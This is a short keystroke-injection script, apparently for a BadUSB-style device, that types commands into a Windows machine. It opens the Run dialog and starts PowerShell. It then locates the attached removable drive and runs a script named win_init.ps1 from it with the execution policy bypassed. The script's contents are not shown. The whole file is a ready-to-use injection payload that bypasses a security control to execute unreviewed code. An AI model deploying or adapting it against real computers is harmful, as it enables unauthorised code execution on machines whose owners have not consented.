layout('us');			

typingSpeed(1,0)	
press("GUI r");
delay(500);
type("powershell\n");
delay(500);
type("$fdrive=get-volume | where drivetype -eq removable | foreach driveletter\n");
delay(500);
type("cd ${fdrive}:\n");
delay(500);
type("powershell -ExecutionPolicy Bypass -File .\\win_init.ps1\n");
delay(500);
type("exit\n");
